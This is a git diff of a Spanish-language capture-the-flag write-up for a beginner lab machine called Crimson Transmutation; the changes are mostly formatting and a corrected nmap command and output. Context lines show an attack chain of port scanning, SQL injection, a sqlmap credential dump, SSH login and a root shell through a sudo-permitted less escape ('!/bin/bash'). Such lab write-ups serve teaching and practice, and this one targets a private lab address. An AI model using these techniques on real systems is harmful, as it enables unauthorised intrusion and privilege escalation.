@@ -8,8 +8,6 @@ Crimson Transmutation es una máquina para principiantes enfocada en el desarrol
 
 El escenario presenta un sistema web con un catálogo antiguo (legacy) vulnerable, lo que permite la explotación mediante **SQL Injection**, seguido de la obtención de credenciales y escalada de privilegios mediante una configuración insegura de `sudo`.
 
----
-
 ### 1.2 Objetivos
 
 - Enumerar servicios expuestos en la máquina objetivo  
@@ -27,13 +25,13 @@ El escenario presenta un sistema web con un catálogo antiguo (legacy) vulnerabl
 Se realiza un escaneo completo de puertos:
 
 ```bash
-sudo nmap -p- -Pn -sS -n --min-rate 5000 192.168.56.104 -oN allports --open
+sudo nmap -p- -Pn -sS -n --min-rate 5000 192.168.56.104 --open
 ```
 Resultados:
 
 ```
 PORT   STATE SERVICE
-22/tcp openssh
+22/tcp open  ssh
 80/tcp open  http
 ```
 
@@ -41,8 +39,6 @@ Se identifican dos vectores principales:
 
 - **SSH (22)** → Posible acceso remoto
 - **HTTP (80)** → Vector principal de ataque
-
----
 
 ### 2.2 Web
 
@@ -88,8 +84,6 @@ Se prueba el payload:
 
 El sistema devuelve todos los registros, confirmando una **SQL Injection**.
 
----
-
 ### 3.2 Enumeración con SQLMap
 
 Se automatiza la explotación con sqlmap.
@@ -107,9 +101,6 @@ available databases [2]:
 [*] crimson_db
 [*] information_schema
 ```
-
----
-
 ### 3.3 Enumeración de tablas
 
 ```
@@ -128,8 +119,6 @@ Database: crimson_db
 +-------------------+
 ```
 
----
-
 ### 3.4 Dump de credenciales
 
 ```
@@ -141,8 +130,6 @@ Se obtienen credenciales:
 ```
 edward : alchemy123
 ```
-
----
 
 ### 3.5 Acceso inicial (SSH)
 
@@ -168,8 +155,6 @@ The old archive search should have been retired months ago.
 I told Al to move the binding study drafts out of my home directory.
 He said he stored the final copy somewhere safer, but root still keeps the master archive.
 ```
-
----
 
 ### 3.6 Movimiento lateral
 
@@ -212,8 +197,6 @@ User alphonse may run the following commands on Crimson-Transmutation:
     (ALL) NOPASSWD: /usr/bin/less /etc/crimson-maintenance.log
 ```
 
----
-
 ### 4.2 Explotación de less
 
 Se ejecuta:
@@ -227,8 +210,6 @@ Dentro de `less`:
 ```
 !/bin/bash
 ```
-
----
 
 ### 4.3 Root
 
